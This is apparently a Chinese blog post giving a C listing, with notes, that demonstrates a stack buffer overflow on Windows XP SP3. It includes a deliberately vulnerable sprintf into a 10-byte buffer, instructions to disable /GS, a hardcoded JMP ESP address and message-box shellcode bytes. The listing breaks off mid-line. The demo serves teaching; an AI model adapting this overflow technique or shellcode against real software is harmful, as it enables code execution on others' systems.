<div class="cnblogs_code"><!--<br><br>Code highlighting produced by Actipro CodeHighlighter (freeware)<br>http://www.CodeHighlighter.com/<br><br>--><span style="color: rgb(0, 128, 128);">这段代码的shellcode是抄的别人的，仅仅显示出一个msgbox提醒一下。<br>编译器为 vc 2005<br>操作系统为 xp sp3<br>如果你的编译器或者操作系统不完全相同，有可能溢出失败<br>大概原理为：<br>&nbsp; 执行sprintf时，将我们构造的长字符串拷贝到堆栈区，从而覆盖了fun函数的返回地址（字符串16字节处），而此时esp正好指向字符串20字节处，因此我们将16处覆盖为jmp esp指令的地址， 将20字节处覆盖为我们的shell code。当函数fun返回时，正好将jmp esp的地址出栈，而执行了jmp esp后，正好执行到20字节处的shell code。<br><br> 1</span><img src="https://www.cnblogs.com/images/OutliningIndicators/None.gif" align="top"><span style="color: rgb(0, 0, 0);">#include&nbsp;</span><span style="color: rgb(0, 0, 0);">&lt;</span><span style="color: rgb(0, 0, 0);">stdio.h</span><span style="color: rgb(0, 0, 0);">&gt;</span><span style="color: rgb(0, 0, 0);"><br></span><span style="color: rgb(0, 128, 128);">&nbsp;2</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/None.gif" align="top">#include&nbsp;</span><span style="color: rgb(0, 0, 0);">&lt;</span><span style="color: rgb(0, 0, 255);">string</span><span style="color: rgb(0, 0, 0);">.h</span><span style="color: rgb(0, 0, 0);">&gt;</span><span style="color: rgb(0, 0, 0);"><br></span><span style="color: rgb(0, 128, 128);">&nbsp;3</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/None.gif" align="top"><br></span><span style="color: rgb(0, 128, 128);">&nbsp;4</span><span style="color: rgb(0, 0, 0);"><img id="Codehighlighter1_40_289_Open_Image" src="https://www.cnblogs.com/images/OutliningIndicators/ExpandedBlockStart.gif" onclick="this.style.display='none'; document.getElementById('Codehighlighter1_40_289_Open_Text').style.display='none'; document.getElementById('Codehighlighter1_40_289_Closed_Image').style.display='inline'; document.getElementById('Codehighlighter1_40_289_Closed_Text').style.display='inline';" align="top"><img id="Codehighlighter1_40_289_Closed_Image" src="https://www.cnblogs.com/images/OutliningIndicators/ContractedBlock.gif" style="display: none;" onclick="this.style.display='none'; document.getElementById('Codehighlighter1_40_289_Closed_Text').style.display='none'; document.getElementById('Codehighlighter1_40_289_Open_Image').style.display='inline'; document.getElementById('Codehighlighter1_40_289_Open_Text').style.display='inline';" align="top"></span><span id="Codehighlighter1_40_289_Closed_Text" style="border: 1px solid rgb(128, 128, 128); background-color: rgb(255, 255, 255); display: none;">/**/</span><span id="Codehighlighter1_40_289_Open_Text"><span style="color: rgb(0, 128, 0);">/*</span><span style="color: rgb(0, 128, 0);">**********************************************************************<br></span><span style="color: rgb(0, 128, 128);">&nbsp;5</span><span style="color: rgb(0, 128, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">please&nbsp;disable&nbsp;缓冲区安全检查：<br></span><span style="color: rgb(0, 128, 128);">&nbsp;6</span><span style="color: rgb(0, 128, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;c/c++　－＞　代码生成　－＞　缓冲区安全检查＝否(/GS-)<br></span><span style="color: rgb(0, 128, 128);">&nbsp;7</span><span style="color: rgb(0, 128, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">please&nbsp;disable&nbsp;优化：<br></span><span style="color: rgb(0, 128, 128);">&nbsp;8</span><span style="color: rgb(0, 128, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;c/c++　－＞　优化　－＞优化=禁用(/Od)<br></span><span style="color: rgb(0, 128, 128);">&nbsp;9</span><span style="color: rgb(0, 128, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/ExpandedBlockEnd.gif" align="top">***********************************************************************</span><span style="color: rgb(0, 128, 0);">*/</span></span><span style="color: rgb(0, 0, 0);"><br></span><span style="color: rgb(0, 128, 128);">10</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/None.gif" align="top"></span><span style="color: rgb(0, 0, 255);">void</span><span style="color: rgb(0, 0, 0);">&nbsp;fun(</span><span style="color: rgb(0, 0, 255);">const</span><span style="color: rgb(0, 0, 0);">&nbsp;</span><span style="color: rgb(0, 0, 255);">char</span><span style="color: rgb(0, 0, 0);">*</span><span style="color: rgb(0, 0, 0);">&nbsp;input)<br></span><span style="color: rgb(0, 128, 128);">11</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/None.gif" align="top"><br></span><span style="color: rgb(0, 128, 128);">12</span><span style="color: rgb(0, 0, 0);"><img id="Codehighlighter1_319_689_Open_Image" src="https://www.cnblogs.com/images/OutliningIndicators/ExpandedBlockStart.gif" onclick="this.style.display='none'; document.getElementById('Codehighlighter1_319_689_Open_Text').style.display='none'; document.getElementById('Codehighlighter1_319_689_Closed_Image').style.display='inline'; document.getElementById('Codehighlighter1_319_689_Closed_Text').style.display='inline';" align="top"><img id="Codehighlighter1_319_689_Closed_Image" src="https://www.cnblogs.com/images/OutliningIndicators/ContractedBlock.gif" style="display: none;" onclick="this.style.display='none'; document.getElementById('Codehighlighter1_319_689_Closed_Text').style.display='none'; document.getElementById('Codehighlighter1_319_689_Open_Image').style.display='inline'; document.getElementById('Codehighlighter1_319_689_Open_Text').style.display='inline';" align="top"></span><span id="Codehighlighter1_319_689_Closed_Text" style="border: 1px solid rgb(128, 128, 128); background-color: rgb(255, 255, 255); display: none;"><img src="https://www.cnblogs.com/images/dot.gif"></span><span id="Codehighlighter1_319_689_Open_Text"><span style="color: rgb(0, 0, 0);">{<br></span><span style="color: rgb(0, 128, 128);">13</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top"><br></span><span style="color: rgb(0, 128, 128);">14</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: rgb(0, 0, 255);">char</span><span style="color: rgb(0, 0, 0);">&nbsp;buf[</span><span style="color: rgb(128, 0, 128);">10</span><span style="color: rgb(0, 0, 0);">];<br></span><span style="color: rgb(0, 128, 128);">15</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: rgb(0, 128, 0);">//</span><span style="color: rgb(0, 128, 0);">_asm&nbsp;int&nbsp;3;</span><span style="color: rgb(0, 128, 0);"><br></span><span style="color: rgb(0, 128, 128);">16</span><span style="color: rgb(0, 128, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top"></span><span style="color: rgb(0, 0, 0);">&nbsp;&nbsp;&nbsp;&nbsp;printf(</span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(128, 0, 0);">My&nbsp;stack&nbsp;look&nbsp;like:\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n\n</span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(0, 0, 0);">);<br></span><span style="color: rgb(0, 128, 128);">17</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;sprintf(buf,</span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(128, 0, 0);">%s</span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(0, 0, 0);">,input);</span><span style="color: rgb(0, 128, 0);">//</span><span style="color: rgb(0, 128, 0);">这里会造成溢出</span><span style="color: rgb(0, 128, 0);"><br></span><span style="color: rgb(0, 128, 128);">18</span><span style="color: rgb(0, 128, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top"></span><span style="color: rgb(0, 0, 0);"><br></span><span style="color: rgb(0, 128, 128);">19</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;printf(</span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(128, 0, 0);">%s\n</span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(0, 0, 0);">,buf);<br></span><span style="color: rgb(0, 128, 128);">20</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: rgb(0, 128, 0);">//</span><span style="color: rgb(0, 128, 0);">_asm&nbsp;int&nbsp;3;</span><span style="color: rgb(0, 128, 0);"><br></span><span style="color: rgb(0, 128, 128);">21</span><span style="color: rgb(0, 128, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top"></span><span style="color: rgb(0, 0, 0);">&nbsp;&nbsp;&nbsp;&nbsp;<br></span><span style="color: rgb(0, 128, 128);">22</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;printf(</span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(128, 0, 0);">New&nbsp;stack&nbsp;look&nbsp;like:\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n\n</span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(0, 0, 0);">);<br></span><span style="color: rgb(0, 128, 128);">23</span><span style="color: rgb(0, 0, 0);"><img id="Codehighlighter1_575_687_Open_Image" src="https://www.cnblogs.com/images/OutliningIndicators/ExpandedSubBlockStart.gif" onclick="this.style.display='none'; document.getElementById('Codehighlighter1_575_687_Open_Text').style.display='none'; document.getElementById('Codehighlighter1_575_687_Closed_Image').style.display='inline'; document.getElementById('Codehighlighter1_575_687_Closed_Text').style.display='inline';" align="top"><img id="Codehighlighter1_575_687_Closed_Image" src="https://www.cnblogs.com/images/OutliningIndicators/ContractedSubBlock.gif" style="display: none;" onclick="this.style.display='none'; document.getElementById('Codehighlighter1_575_687_Closed_Text').style.display='none'; document.getElementById('Codehighlighter1_575_687_Open_Image').style.display='inline'; document.getElementById('Codehighlighter1_575_687_Open_Text').style.display='inline';" align="top">&nbsp;&nbsp;&nbsp;&nbsp;</span><span id="Codehighlighter1_575_687_Closed_Text" style="border: 1px solid rgb(128, 128, 128); background-color: rgb(255, 255, 255); display: none;">/**/</span><span id="Codehighlighter1_575_687_Open_Text"><span style="color: rgb(0, 128, 0);">/*</span><span style="color: rgb(0, 128, 0);">_asm<br></span><span style="color: rgb(0, 128, 128);">24</span><span style="color: rgb(0, 128, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;{<br></span><span style="color: rgb(0, 128, 128);">25</span><span style="color: rgb(0, 128, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,dword&nbsp;ptr&nbsp;[ebp-4]&nbsp;;<br></span><span style="color: rgb(0, 128, 128);">26</span><span style="color: rgb(0, 128, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,ebp;<br></span><span style="color: rgb(0, 128, 128);">27</span><span style="color: rgb(0, 128, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;eax,0x403000;<br></span><span style="color: rgb(0, 128, 128);">28</span><span style="color: rgb(0, 128, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;[eax],ecx;<br></span><span style="color: rgb(0, 128, 128);">29</span><span style="color: rgb(0, 128, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/ExpandedSubBlockEnd.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;}</span><span style="color: rgb(0, 128, 0);">*/</span></span><span style="color: rgb(0, 0, 0);"><br></span><span style="color: rgb(0, 128, 128);">30</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/ExpandedBlockEnd.gif" align="top">}</span></span><span style="color: rgb(0, 0, 0);"><br></span><span style="color: rgb(0, 128, 128);">31</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/None.gif" align="top"><br></span><span style="color: rgb(0, 128, 128);">32</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/None.gif" align="top"><br></span><span style="color: rgb(0, 128, 128);">33</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/None.gif" align="top"></span><span style="color: rgb(0, 0, 255);">char</span><span style="color: rgb(0, 0, 0);">&nbsp;failwest_popup[]</span><span style="color: rgb(0, 0, 0);">=</span><span style="color: rgb(0, 0, 0);"><br></span><span style="color: rgb(0, 128, 128);">34</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/None.gif" align="top"></span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(128, 0, 0);">\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C</span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(0, 0, 0);"><br></span><span style="color: rgb(0, 128, 128);">35</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/None.gif" align="top"></span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(128, 0, 0);">\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53</span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(0, 0, 0);"><br></span><span style="color: rgb(0, 128, 128);">36</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/None.gif" align="top"></span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(128, 0, 0);">\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B</span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(0, 0, 0);"><br></span><span style="color: rgb(0, 128, 128);">37</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/None.gif" align="top"></span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(128, 0, 0);">\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95</span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(0, 0, 0);"><br></span><span style="color: rgb(0, 128, 128);">38</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/None.gif" align="top"></span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(128, 0, 0);">\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59</span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(0, 0, 0);"><br></span><span style="color: rgb(0, 128, 128);">39</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/None.gif" align="top"></span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(128, 0, 0);">\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A</span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(0, 0, 0);"><br></span><span style="color: rgb(0, 128, 128);">40</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/None.gif" align="top"></span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(128, 0, 0);">\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75</span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(0, 0, 0);"><br></span><span style="color: rgb(0, 128, 128);">41</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/None.gif" align="top"></span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(128, 0, 0);">\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03</span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(0, 0, 0);"><br></span><span style="color: rgb(0, 128, 128);">42</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/None.gif" align="top"></span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(128, 0, 0);">\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB</span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(0, 0, 0);"><br></span><span style="color: rgb(0, 128, 128);">43</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/None.gif" align="top"></span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(128, 0, 0);">\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50</span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(0, 0, 0);"><br></span><span style="color: rgb(0, 128, 128);">44</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/None.gif" align="top"></span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(128, 0, 0);">\x53\xFF\x57\xFC\x53\xFF\x57\xF8</span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(0, 0, 0);">;<br></span><span style="color: rgb(0, 128, 128);">45</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/None.gif" align="top"><br></span><span style="color: rgb(0, 128, 128);">46</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/None.gif" align="top"></span><span style="color: rgb(0, 0, 255);">int</span><span style="color: rgb(0, 0, 0);">&nbsp;main(</span><span style="color: rgb(0, 0, 255);">int</span><span style="color: rgb(0, 0, 0);">&nbsp;argc,&nbsp;</span><span style="color: rgb(0, 0, 255);">char</span><span style="color: rgb(0, 0, 0);">*</span><span style="color: rgb(0, 0, 0);">&nbsp;argv[])<br></span><span style="color: rgb(0, 128, 128);">47</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/None.gif" align="top"><br></span><span style="color: rgb(0, 128, 128);">48</span><span style="color: rgb(0, 0, 0);"><img id="Codehighlighter1_1624_2021_Open_Image" src="https://www.cnblogs.com/images/OutliningIndicators/ExpandedBlockStart.gif" onclick="this.style.display='none'; document.getElementById('Codehighlighter1_1624_2021_Open_Text').style.display='none'; document.getElementById('Codehighlighter1_1624_2021_Closed_Image').style.display='inline'; document.getElementById('Codehighlighter1_1624_2021_Closed_Text').style.display='inline';" align="top"><img id="Codehighlighter1_1624_2021_Closed_Image" src="https://www.cnblogs.com/images/OutliningIndicators/ContractedBlock.gif" style="display: none;" onclick="this.style.display='none'; document.getElementById('Codehighlighter1_1624_2021_Closed_Text').style.display='none'; document.getElementById('Codehighlighter1_1624_2021_Open_Image').style.display='inline'; document.getElementById('Codehighlighter1_1624_2021_Open_Text').style.display='inline';" align="top"></span><span id="Codehighlighter1_1624_2021_Closed_Text" style="border: 1px solid rgb(128, 128, 128); background-color: rgb(255, 255, 255); display: none;"><img src="https://www.cnblogs.com/images/dot.gif"></span><span id="Codehighlighter1_1624_2021_Open_Text"><span style="color: rgb(0, 0, 0);">{<br></span><span style="color: rgb(0, 128, 128);">49</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top"><br></span><span style="color: rgb(0, 128, 128);">50</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;printf(</span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(128, 0, 0);">address&nbsp;of&nbsp;foo=%p\n</span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(0, 0, 0);">,fun);<br></span><span style="color: rgb(0, 128, 128);">51</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top"><br></span><span style="color: rgb(0, 128, 128);">52</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top"></span><span style="color: rgb(0, 0, 255);">#define</span><span style="color: rgb(0, 0, 0);">&nbsp;N&nbsp;1000</span><span style="color: rgb(0, 0, 0);"><br></span><span style="color: rgb(0, 128, 128);">53</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: rgb(0, 0, 255);">char</span><span style="color: rgb(0, 0, 0);">&nbsp;ss[N];</span><span style="color: rgb(0, 128, 0);">//</span><span style="color: rgb(0, 128, 0);">="AAAAAAAAAA";</span><span style="color: rgb(0, 128, 0);"><br></span><span style="color: rgb(0, 128, 128);">54</span><span style="color: rgb(0, 128, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top"></span><span style="color: rgb(0, 0, 0);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br></span><span style="color: rgb(0, 128, 128);">55</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: rgb(0, 0, 255);">for</span><span style="color: rgb(0, 0, 0);">&nbsp;(</span><span style="color: rgb(0, 0, 255);">int</span><span style="color: rgb(0, 0, 0);">&nbsp;i</span><span style="color: rgb(0, 0, 0);">=</span><span style="color: rgb(128, 0, 128);">0</span><span style="color: rgb(0, 0, 0);">;i</span><span style="color: rgb(0, 0, 0);">&lt;</span><span style="color: rgb(0, 0, 0);">N;i</span><span style="color: rgb(0, 0, 0);">++</span><span style="color: rgb(0, 0, 0);">)<br></span><span style="color: rgb(0, 128, 128);">56</span><span style="color: rgb(0, 0, 0);"><img id="Codehighlighter1_1736_1758_Open_Image" src="https://www.cnblogs.com/images/OutliningIndicators/ExpandedSubBlockStart.gif" onclick="this.style.display='none'; document.getElementById('Codehighlighter1_1736_1758_Open_Text').style.display='none'; document.getElementById('Codehighlighter1_1736_1758_Closed_Image').style.display='inline'; document.getElementById('Codehighlighter1_1736_1758_Closed_Text').style.display='inline';" align="top"><img id="Codehighlighter1_1736_1758_Closed_Image" src="https://www.cnblogs.com/images/OutliningIndicators/ContractedSubBlock.gif" style="display: none;" onclick="this.style.display='none'; document.getElementById('Codehighlighter1_1736_1758_Closed_Text').style.display='none'; document.getElementById('Codehighlighter1_1736_1758_Open_Image').style.display='inline'; document.getElementById('Codehighlighter1_1736_1758_Open_Text').style.display='inline';" align="top">&nbsp;&nbsp;&nbsp;&nbsp;</span><span id="Codehighlighter1_1736_1758_Closed_Text" style="border: 1px solid rgb(128, 128, 128); background-color: rgb(255, 255, 255); display: none;"><img src="https://www.cnblogs.com/images/dot.gif"></span><span id="Codehighlighter1_1736_1758_Open_Text"><span style="color: rgb(0, 0, 0);">{<br></span><span style="color: rgb(0, 128, 128);">57</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ss[i]</span><span style="color: rgb(0, 0, 0);">=</span><span style="color: rgb(128, 0, 0);">'</span><span style="color: rgb(128, 0, 0);">0</span><span style="color: rgb(128, 0, 0);">'</span><span style="color: rgb(0, 0, 0);">+</span><span style="color: rgb(0, 0, 0);">i</span><span style="color: rgb(0, 0, 0);">/</span><span style="color: rgb(128, 0, 128);">10</span><span style="color: rgb(0, 0, 0);">;<br></span><span style="color: rgb(0, 128, 128);">58</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/ExpandedSubBlockEnd.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;}</span></span><span style="color: rgb(0, 0, 0);"><br></span><span style="color: rgb(0, 128, 128);">59</span><span style="color: rgb(0, 0, 0);"><img id="Codehighlighter1_1760_1913_Open_Image" src="https://www.cnblogs.com/images/OutliningIndicators/ExpandedSubBlockStart.gif" onclick="this.style.display='none'; document.getElementById('Codehighlighter1_1760_1913_Open_Text').style.display='none'; document.getElementById('Codehighlighter1_1760_1913_Closed_Image').style.display='inline'; document.getElementById('Codehighlighter1_1760_1913_Closed_Text').style.display='inline';" align="top"><img id="Codehighlighter1_1760_1913_Closed_Image" src="https://www.cnblogs.com/images/OutliningIndicators/ContractedSubBlock.gif" style="display: none;" onclick="this.style.display='none'; document.getElementById('Codehighlighter1_1760_1913_Closed_Text').style.display='none'; document.getElementById('Codehighlighter1_1760_1913_Open_Image').style.display='inline'; document.getElementById('Codehighlighter1_1760_1913_Open_Text').style.display='inline';" align="top">&nbsp;&nbsp;&nbsp;&nbsp;</span><span id="Codehighlighter1_1760_1913_Closed_Text" style="border: 1px solid rgb(128, 128, 128); background-color: rgb(255, 255, 255); display: none;">/**/</span><span id="Codehighlighter1_1760_1913_Open_Text"><span style="color: rgb(0, 128, 0);">/*</span><span style="color: rgb(0, 128, 0);">int&nbsp;p=16;<br></span><span style="color: rgb(0, 128, 128);">60</span><span style="color: rgb(0, 128, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;ss[p++]='2';<br></span><span style="color: rgb(0, 128, 128);">61</span><span style="color: rgb(0, 128, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;ss[p++]='2';<br></span><span style="color: rgb(0, 128, 128);">62</span><span style="color: rgb(0, 128, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;ss[p++]='2';<br></span><span style="color: rgb(0, 128, 128);">63</span><span style="color: rgb(0, 128, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;ss[p++]='2';<br></span><span style="color: rgb(0, 128, 128);">64</span><span style="color: rgb(0, 128, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;p2=20;<br></span><span style="color: rgb(0, 128, 128);">65</span><span style="color: rgb(0, 128, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;ss[p2++]='3';<br></span><span style="color: rgb(0, 128, 128);">66</span><span style="color: rgb(0, 128, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;ss[p2++]='3';<br></span><span style="color: rgb(0, 128, 128);">67</span><span style="color: rgb(0, 128, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;ss[p2++]='3';<br></span><span style="color: rgb(0, 128, 128);">68</span><span style="color: rgb(0, 128, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;ss[p2++]='3';<br></span><span style="color: rgb(0, 128, 128);">69</span><span style="color: rgb(0, 128, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/ExpandedSubBlockEnd.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;ss[N-1]=0;</span><span style="color: rgb(0, 128, 0);">*/</span></span><span style="color: rgb(0, 0, 0);"><br></span><span style="color: rgb(0, 128, 128);">70</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;strcpy(ss</span><span style="color: rgb(0, 0, 0);">+</span><span style="color: rgb(128, 0, 128);">16</span><span style="color: rgb(0, 0, 0);">,&nbsp;</span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(128, 0, 0);">\x12\x45\xfa\x7f</span><span style="color: rgb(128, 0, 0);">"</span><span style="color: rgb(0, 0, 0);">);&nbsp;</span><span style="color: rgb(0, 128, 0);">//</span><span style="color: rgb(0, 128, 0);">JMP&nbsp;ESP</span><span style="color: rgb(0, 128, 0);"><br></span><span style="color: rgb(0, 128, 128);">71</span><span style="color: rgb(0, 128, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top"></span><span style="color: 